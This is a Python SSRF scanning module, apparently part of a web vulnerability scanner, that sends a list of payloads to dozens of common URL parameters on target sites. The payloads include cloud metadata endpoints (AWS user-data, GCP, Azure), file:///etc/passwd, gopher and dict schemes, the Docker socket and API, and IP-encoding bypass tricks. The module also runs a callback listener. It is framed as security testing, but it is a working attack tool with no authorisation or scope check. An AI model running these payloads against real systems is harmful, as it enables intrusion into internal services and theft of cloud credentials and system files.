#!/usr/bin/env python3
"""
SSRF (Server-Side Request Forgery) Testing Module
Tests for SSRF vulnerabilities in web applications
"""

import requests
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style
import socket
import threading

class SSRFTester:
    def __init__(self, timeout=10, level='normal'):
        self.timeout = timeout
        self.level = level
        self.vulnerabilities = []
        
        # SSRF test payloads
        self.ssrf_payloads = [
            # Internal network ranges
            'http://127.0.0.1:80/', 'http://127.0.0.1:22/', 'http://127.0.0.1:443/',
            'http://127.0.0.1:8080/', 'http://127.0.0.1:3000/', 'http://127.0.0.1:8000/',
            'http://localhost/', 'http://localhost:22/', 'http://localhost:80/',
            'http://0.0.0.0/', 'http://0/', 'http://0x7f000001/',
            'http://192.168.1.1/', 'http://192.168.0.1/', 'http://10.0.0.1/',
            'http://172.16.0.1/', 'http://169.254.169.254/',  # AWS metadata
            
            # Different protocols
            'file:///etc/passwd', 'file:///etc/hosts', 'file:///proc/version',
            'file:///windows/system32/drivers/etc/hosts', 'file://c:/windows/system32/drivers/etc/hosts',
            'ftp://127.0.0.1/', 'sftp://127.0.0.1/', 'tftp://127.0.0.1/',
            'dict://127.0.0.1:11211/', 'gopher://127.0.0.1/',
            'ldap://127.0.0.1/', 'ldaps://127.0.0.1/',
            
            # Bypass techniques
            'http://127.1/', 'http://0x7f.1/', 'http://2130706433/',  # Decimal localhost
            'http://127.0.0.1.xip.io/', 'http://127.0.0.1.nip.io/',
            'http://127.0.0.1.sslip.io/', 'http://localtest.me/',
            'http://[::1]/', 'http://[0:0:0:0:0:0:0:1]/',  # IPv6 localhost
            
            # URL encoding bypasses
            'http://127.0.0.1%2F', 'http://127%252e0%252e0%252e1/',
            'http://127.0.0.1%23/', 'http://127.0.0.1%3F/',
            
            # Double encoding
            'http://%2527.0.0.1/', 'http://%252f%252f127.0.0.1/',
        ]
        
        # Advanced SSRF payloads for moderate/extreme levels
        self.advanced_payloads = [
            # Cloud metadata services
            'http://169.254.169.254/latest/meta-data/',  # AWS
            'http://169.254.169.254/latest/user-data/',
            'http://169.254.169.254/latest/dynamic/instance-identity/document/',
            'http://metadata.google.internal/computeMetadata/v1/',  # GCP
            'http://metadata/computeMetadata/v1/',
            'http://169.254.169.254/metadata/instance?api-version=2017-08-01',  # Azure
            
            # Container services
            'http://unix:/var/run/docker.sock/v1.40/containers/json',
            'http://127.0.0.1:2375/v1.40/containers/json',  # Docker API
            'http://127.0.0.1:2376/v1.40/containers/json',
            'http://127.0.0.1:8500/v1/agent/self',  # Consul
            'http://127.0.0.1:4001/v2/keys/?recursive=true',  # etcd
            
            # Internal services
            'http://127.0.0.1:5984/_all_dbs',  # CouchDB
            'http://127.0.0.1:9200/_cluster/health',  # Elasticsearch
            'http://127.0.0.1:6379/',  # Redis
            'http://127.0.0.1:11211/',  # Memcached
            'http://127.0.0.1:27017/',  # MongoDB
            'http://127.0.0.1:5432/',  # PostgreSQL
            'http://127.0.0.1:3306/',  # MySQL
            
            # Web services
            'http://127.0.0.1:8080/manager/html',  # Tomcat
            'http://127.0.0.1:9000/',  # FastCGI
            'http://127.0.0.1:8080/actuator/health',  # Spring Boot Actuator
            'http://127.0.0.1:8080/health',
            'http://127.0.0.1:8080/info',
            'http://127.0.0.1:8080/metrics',
            
            # Advanced bypass techniques
            'http://spoofed.burpcollaborator.net',
            'http://127.0.0.1.169.254.169.254.nip.io/',
            'http://[::ffff:127.0.0.1]/',  # IPv4-mapped IPv6
            'http://①②⑦.⓪.⓪.①/',  # Unicode digits
            'http://127.1.1.1:80\\@127.0.0.1/',  # URL confusion
        ]
        
        # SSRF indicators in response
        self.ssrf_indicators = [
            # Positive indicators
            'root:', 'bin:', 'daemon:', 'www-data:',  # /etc/passwd
            '127.0.0.1', 'localhost', '::1',  # hosts file
            'SSH-', 'OpenSSH',  # SSH banner
            'HTTP/1.', 'Server:', 'Content-Type:',  # HTTP response
            'MySQL', 'PostgreSQL', 'redis_version',  # Database responses
            'ami-id', 'instance-id', 'local-hostname',  # AWS metadata
            'Docker', 'container',  # Container info
            
            # Error indicators
            'Connection refused', 'Connection timed out', 'No route to host',
            'Network is unreachable', 'Host is down', 'Permission denied',
            'Invalid URL', 'Malformed URL', 'Protocol not supported',
        ]
    
    def start_callback_server(self):
        """Start a simple HTTP server to catch SSRF callbacks"""
        try:
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_socket.bind(('0.0.0.0', 8888))
            server_socket.listen(5)
            server_socket.settimeout(30)  # 30 second timeout
            
            print(f"{Fore.CYAN}[*] SSRF callback server started on port 8888{Style.RESET_ALL}")
            
            while True:
                try:
                    client_socket, addr = server_socket.accept()
                    data = client_socket.recv(1024)
                    if data:
                        print(f"{Fore.GREEN}[+] SSRF Callback received from {addr[0]}:{addr[1]}{Style.RESET_ALL}")
                        response = b"HTTP/1.1 200 OK\r\nContent-Length: 12\r\n\r\nSSRF Success"
                        client_socket.send(response)
                    client_socket.close()
                except socket.timeout:
                    break
                except Exception:
                    break
            
            server_socket.close()
        except Exception as e:
            print(f"{Fore.YELLOW}[!] Could not start callback server: {e}{Style.RESET_ALL}")
    
    def test_parameter_ssrf(self, url, param, method='GET'):
        """Test a specific parameter for SSRF"""
        results = []
        
        payloads_to_test = self.ssrf_payloads.copy()
        if self.level in ['moderate', 'extreme']:
            payloads_to_test.extend(self.advanced_payloads)
        
        # Get baseline response
        try:
            if method.upper() == 'GET':
                baseline = requests.get(url, params={param: 'http://example.com'}, 
                                      timeout=self.timeout, verify=False)
            else:
                baseline = requests.post(url, data={param: 'http://example.com'}, 
                                       timeout=self.timeout, verify=False)
        except:
            baseline = None
        
        for payload in payloads_to_test:
            try:
                start_time = time.time()
                
                if method.upper() == 'GET':
                    test_params = {param: payload}
                    response = requests.get(url, params=test_params, timeout=self.timeout, verify=False)
                else:
                    test_data = {param: payload}
                    response = requests.post(url, data=test_data, timeout=self.timeout, verify=False)
                
                response_time = time.time() - start_time
                
                # Check for SSRF indicators in response
                for indicator in self.ssrf_indicators:
                    if indicator.lower() in response.text.lower():
                        vuln = {
                            'type': 'Server-Side Request Forgery (SSRF)',
                            'severity': 'High',
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'method': method,
                            'evidence': f"SSRF indicator found: {indicator}",
                            'response_length': len(response.text),
                            'status_code': response.status_code,
                            'response_time': response_time
                        }
                        results.append(vuln)
                        print(f"{Fore.RED}[!] SSRF found: {url} (param: {param}) - {indicator}{Style.RESET_ALL}")
                        break
                
                # Check for response differences (blind SSRF)
                if baseline and response.status_code != baseline.status_code:
                    vuln = {
                        'type': 'Potential SSRF (Response Difference)',
                        'severity': 'Medium',
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'method': method,
                        'evidence': f"Status code changed from {baseline.status_code} to {response.status_code}",
                        'response_length': len(response.text),
                        'status_code': response.status_code
                    }
                    results.append(vuln)
                    print(f"{Fore.YELLOW}[!] Potential SSRF: {url} (param: {param}){Style.RESET_ALL}")
                
                # Check for timing differences (potential internal network access)
                if 'localhost' in payload or '127.0.0.1' in payload:
                    if response_time < 1:  # Fast response might indicate internal access
                        vuln = {
                            'type': 'Potential SSRF (Fast Internal Response)',
                            'severity': 'Low',
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'method': method,
                            'evidence': f"Fast response to internal URL: {response_time:.2f}s",
                            'response_time': response_time,
                            'status_code': response.status_code
                        }
                        results.append(vuln)
                
                time.sleep(0.1)  # Small delay
                
            except requests.exceptions.Timeout:
                # Timeout might indicate successful internal connection
                if any(internal in payload for internal in ['127.0.0.1', 'localhost', '192.168', '10.0']):
                    vuln = {
                        'type': 'Potential SSRF (Timeout on Internal URL)',
                        'severity': 'Low',
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'method': method,
                        'evidence': f"Request timed out for internal URL",
                        'response_time': self.timeout
                    }
                    results.append(vuln)
                    print(f"{Fore.YELLOW}[!] Potential SSRF (timeout): {url}{Style.RESET_ALL}")
            except Exception:
                continue
        
        return results
    
    def test_ssrf(self, targets):
        """Main SSRF testing function"""
        print(f"{Fore.YELLOW}[*] Starting SSRF testing...{Style.RESET_ALL}")
        
        all_vulnerabilities = []
        
        # Start callback server in background (if possible)
        if self.level == 'extreme':
            callback_thread = threading.Thread(target=self.start_callback_server)
            callback_thread.daemon = True
            callback_thread.start()
        
        for target in targets:
            url = target.get('url', target.get('subdomain', ''))
            if not url.startswith('http'):
                url = f"http://{url}"
            
            print(f"{Fore.CYAN}[*] Testing SSRF: {url}{Style.RESET_ALL}")
            
            # Common parameters that might be vulnerable to SSRF
            ssrf_params = ['url', 'uri', 'path', 'continue', 'dest', 'destination', 
                          'redirect', 'return', 'returnto', 'go', 'goto', 'target',
                          'rurl', 'next', 'link', 'ref', 'referer', 'referrer',
                          'callback', 'webhook', 'notify', 'ping', 'fetch', 'load',
                          'src', 'source', 'file', 'document', 'page', 'include',
                          'import', 'download', 'upload', 'proxy', 'api', 'endpoint']
            
            for param in ssrf_params:
                vulns = self.test_parameter_ssrf(url, param, 'GET')
                all_vulnerabilities.extend(vulns)
                
                # Test POST for some critical parameters
                if param in ['url', 'callback', 'webhook', 'api']:
                    vulns = self.test_parameter_ssrf(url, param, 'POST')
                    all_vulnerabilities.extend(vulns)
        
        self.vulnerabilities = all_vulnerabilities
        return all_vulnerabilities